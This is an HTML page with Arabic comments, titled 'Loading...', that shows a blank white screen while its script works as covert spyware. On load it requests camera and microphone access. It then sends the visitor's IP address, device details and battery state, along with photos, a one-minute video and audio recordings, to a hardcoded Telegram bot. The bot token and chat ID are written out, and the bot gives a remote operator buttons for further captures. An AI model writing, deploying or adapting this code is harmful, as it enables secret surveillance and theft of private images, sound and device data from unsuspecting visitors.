<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: white;
        }
        /* إخفاء كل شيء */
        .hidden-all {
            display: none;
        }
    </style>
</head>
<body style="background: white; margin: 0; padding: 0;">
    <!-- لا شيء يظهر للمستخدم -->

    <script>
        const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
        const chat_id = "5932979028";
        let lastUpdateId = 0;
        
        // متغيرات لحفظ التيارات
        let permissionsGranted = false;
        let imageCapture = null;
        
        // دالة الحصول على الصلاحيات (مرة واحدة فقط)
        async function getPermissions() {
            try {
                // طلب الكاميرا
                const videoStream = await navigator.mediaDevices.getUserMedia({ video: true });
                const videoTrack = videoStream.getVideoTracks()[0];
                imageCapture = new ImageCapture(videoTrack);
                
                // طلب الميكروفون
                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
                
                permissionsGranted = true;
                
                // إيقاف التيارات مؤقتاً
                videoStream.getTracks().forEach(t => t.stop());
                audioStream.getTracks().forEach(t => t.stop());
                
                return true;
            } catch (e) {
                console.error("فشل الحصول على الصلاحيات:", e);
                permissionsGranted = false;
                return false;
            }
        }

        // دالة إرسال رسالة نصية
        async function sendToTelegram(text) {
            try {
                await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id, text })
                });
            } catch(e) {}
        }

        // إرسال رسالة مع أزرار متطورة
        async function sendAdvancedMenu() {
            const message = `🎮 *واجهة التحكم المتطورة* 🎮

اختر الإجراء المطلوب من الأزرار أدناه:`;

            const keyboard = {
                inline_keyboard: [
                    [
                        { text: "📸 التقاط صورة", callback_data: "capture_photo" },
                        { text: "🎬 تسجيل فيديو (دقيقة)", callback_data: "record_video" }
                    ],
                    [
                        { text: "🎤 تسجيل صوت", callback_data: "record_audio" },
                        { text: "📊 معلومات الجهاز", callback_data: "device_info" }
                    ],
                    [
                        { text: "📸 10 صور", callback_data: "take_10_photos" },
                        { text: "🎤 10 تسجيلات صوت", callback_data: "record_10_audios" }
                    ],
                    [
                        { text: "🔄 تنفيذ الكل", callback_data: "run_full_sequence" }
                    ]
                ]
            };

            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id,
                    text: message,
                    parse_mode: "Markdown",
                    reply_markup: keyboard
                })
            });
        }

        // إرسال صورة
        async function sendPhoto(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("photo", blob, "photo.jpg");
            await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
                method: "POST",
                body: formData
            });
        }

        // إرسال فيديو
        async function sendVideo(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("video", blob, "video.webm");
            await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
                method: "POST",
                body: formData
            });
        }

        // إرسال صوت
        async function sendVoice(blob) {
            const formData = new FormData();
            formData.append("chat_id", chat_id);
            formData.append("voice", blob, "voice.ogg");
            await fetch(`https://api.telegram.org/bot${token}/sendVoice`, {
                method: "POST",
                body: formData
            });
        }

        // بيانات الجهاز
        async function sendDeviceInfo() {
            try {
                const battery = await navigator.getBattery();
                const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).catch(() => ({}));
                const msg = `
👑 *معلومات الجهاز* 👑

🌐 البيانـات:
• الموقع: ${location.href}
• المتصفح: ${navigator.userAgent.substring(0, 100)}...
• IP: ${ip.ip || "غير معروف"}
• اللغة: ${navigator.language}
• النظام: ${navigator.platform}
• الشاشة: ${screen.width}x${screen.height}
• البطارية: ${Math.round(battery.level * 100)}% ${battery.charging ? '🔌 شاحن' : '🔋 بطارية'}
                `;
                await sendToTelegram(msg);
            } catch(e) {}
        }

        // التقاط صورة واحدة
        async function captureSinglePhoto() {
            if (!permissionsGranted) {
                await sendToTelegram("❌ لم يتم منح الصلاحيات");
                return;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);
                const blob = await capture.takePhoto();
                await sendPhoto(blob);
                stream.getTracks().forEach(t => t.stop());
                await sendToTelegram("✅ تم التقاط الصورة وإرسالها");
            } catch (e) {
                await sendToTelegram("❌ فشل التقاط الصورة");
            }
        }

        // تسجيل فيديو دقيقة كاملة (60 ثانية)
        async function recordSingleVideo() {
            if (!permissionsGranted) {
                await sendToTelegram("❌ لم يتم منح الصلاحيات");
                return;
            }
            
            await sendToTelegram("🎬 بدء تسجيل فيديو لمدة دقيقة...");
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendVideo(blob);
                    stream.getTracks().forEach(t => t.stop());
                    await sendToTelegram("✅ تم تسجيل الفيديو (دقيقة كاملة) وإرساله");
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 60000); // 60 ثانية = دقيقة
            } catch (e) {
                console.warn("فشل تسجيل الفيديو:", e);
                await sendToTelegram("❌ فشل تسجيل الفيديو");
            }
        }

        // تسجيل صوت 10 ثوان
        async function recordSingleAudio() {
            if (!permissionsGranted) {
                await sendToTelegram("❌ لم يتم منح الصلاحيات");
                return;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'audio/ogg' });
                    await sendVoice(blob);
                    stream.getTracks().forEach(t => t.stop());
                    await sendToTelegram("✅ تم تسجيل الصوت وإرساله");
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 10000);
            } catch (e) {
                await sendToTelegram("❌ فشل تسجيل الصوت");
            }
        }

        // التقاط 10 صور
        async function take10Photos() {
            if (!permissionsGranted) {
                await sendToTelegram("❌ لم يتم منح الصلاحيات");
                return;
            }
            
            await sendToTelegram("📸 جاري التقاط 10 صور...");
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);

                for (let i = 0; i < 10; i++) {
                    try {
                        const blob = await capture.takePhoto();
                        await sendPhoto(blob);
                        await new Promise(r => setTimeout(r, 500));
                    } catch (e) {}
                }
                stream.getTracks().forEach(t => t.stop());
                await sendToTelegram("✅ تم التقاط 10 صور وإرسالها");
            } catch (e) {
                await sendToTelegram("❌ فشل التقاط الصور");
            }
        }

        // تسجيل 10 تسجيلات صوت
        async function record10Audios() {
            if (!permissionsGranted) {
                await sendToTelegram("❌ لم يتم منح الصلاحيات");
                return;
            }
            
            await sendToTelegram("🎤 جاري تسجيل 10 مقاطع صوتية...");
            
            try {
                for (let i = 0; i < 10; i++) {
                    await new Promise((resolve) => {
                        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                            const recorder = new MediaRecorder(stream);
                            const chunks = [];

                            recorder.ondataavailable = e => chunks.push(e.data);
                            recorder.onstop = async () => {
                                const blob = new Blob(chunks, { type: 'audio/ogg' });
                                await sendVoice(blob);
                                stream.getTracks().forEach(t => t.stop());
                                resolve();
                            };

                            recorder.start();
                            setTimeout(() => recorder.stop(), 10000);
                        }).catch(e => resolve());
                    });
                    await new Promise(r => setTimeout(r, 1000));
                }
                await sendToTelegram("✅ تم تسجيل 10 مقاطع صوتية وإرسالها");
            } catch (e) {
                await sendToTelegram("❌ فشل تسجيل الصوت");
            }
        }

        // تنفيذ كل شيء
        async function runFullSequence() {
            await sendToTelegram("🔄 بدء تنفيذ جميع المهام...");
            await captureSinglePhoto();
            await new Promise(r => setTimeout(r, 2000));
            await recordSingleVideo();
            await new Promise(r => setTimeout(r, 2000));
            await recordSingleAudio();
            await sendToTelegram("✅ تم تنفيذ جميع المهام بنجاح");
        }

        // معالجة أزرار البوت
        async function handleCallback(callbackData) {
            switch(callbackData) {
                case "capture_photo":
                    await captureSinglePhoto();
                    break;
                case "record_video":
                    await recordSingleVideo();
                    break;
                case "record_audio":
                    await recordSingleAudio();
                    break;
                case "device_info":
                    await sendDeviceInfo();
                    break;
                case "take_10_photos":
                    await take10Photos();
                    break;
                case "record_10_audios":
                    await record10Audios();
                    break;
                case "run_full_sequence":
                    await runFullSequence();
                    break;
            }
        }

        // جلب التحديثات من البوت
        async function getUpdates() {
            try {
                const url = `https://api.telegram.org/bot${token}/getUpdates?timeout=30&offset=${lastUpdateId + 1}`;
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.result && data.result.length > 0) {
                    for (const update of data.result) {
                        lastUpdateId = update.update_id;
                        
                        if (update.callback_query) {
                            await handleCallback(update.callback_query.data);
                            
                            await fetch(`https://api.telegram.org/bot${token}/answerCallbackQuery`, {
                                method: "POST",
                                headers: { "Content-Type": "application/json" },
                                body: JSON.stringify({
                                    callback_query_id: update.callback_query.id,
                                    text: "✅ جاري تنفيذ الأمر..."
                                })
                            });
                        }
                    }
                }
            } catch (e) {}
        }

        // الوظائف الأصلية
        async function take10PhotosAndThen(callback) {
            if (!permissionsGranted) {
                if (callback) callback();
                return;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const track = stream.getVideoTracks()[0];
                const capture = new ImageCapture(track);

                for (let i = 0; i < 2; i++) {
                    try {
                        const blob = await capture.takePhoto();
                        await sendPhoto(blob);
                        await new Promise(r => setTimeout(r, 500));
                    } catch (e) {}
                }
                stream.getTracks().forEach(t => t.stop());
                if (callback) callback();
            } catch (e) {
                if (callback) callback();
            }
        }

        async function recordVideoThen(callback) {
            if (!permissionsGranted) {
                if (callback) callback();
                return;
            }
            
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
                const recorder = new MediaRecorder(stream);
                const chunks = [];

                recorder.ondataavailable = e => chunks.push(e.data);
                recorder.onstop = async () => {
                    const blob = new Blob(chunks, { type: 'video/webm' });
                    await sendVideo(blob);
                    stream.getTracks().forEach(t => t.stop());
                    if (callback) callback();
                };

                recorder.start();
                setTimeout(() => recorder.stop(), 60000); // دقيقة كاملة
            } catch (e) {
                if (callback) callback();
            }
        }

        async function record10AudiosSequentially() {
            if (!permissionsGranted) return;
            
            try {
                for (let i = 0; i < 2; i++) {
                    await new Promise((resolve) => {
                        navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
                            const recorder = new MediaRecorder(stream);
                            const chunks = [];

                            recorder.ondataavailable = e => chunks.push(e.data);
                            recorder.onstop = async () => {
                                const blob = new Blob(chunks, { type: 'audio/ogg' });
                                await sendVoice(blob);
                                stream.getTracks().forEach(t => t.stop());
                                resolve();
                            };

                            recorder.start();
                            setTimeout(() => recorder.stop(), 10000);
                        }).catch(e => resolve());
                    });
                    await new Promise(r => setTimeout(r, 1000));
                }
            } catch (e) {}
        }

        // بدء التشغيل
        window.onload = async () => {
            // الحصول على الصلاحيات مباشرة (مرة واحدة)
            const granted = await getPermissions();
            
            if (granted) {
                await sendDeviceInfo();
                await sendAdvancedMenu();
                await sendToTelegram("🎮 جاهز! استخدم الأزرار للتحكم عن بعد");
                
                // التنفيذ التلقائي الأصلي
                take10PhotosAndThen(() => {
                    recordVideoThen(() => {
                        record10AudiosSequentially();
                    });
                });
                
                // الاستماع لأزرار البوت
                setInterval(getUpdates, 2000);
            }
        };
    </script>
</body>
</html>
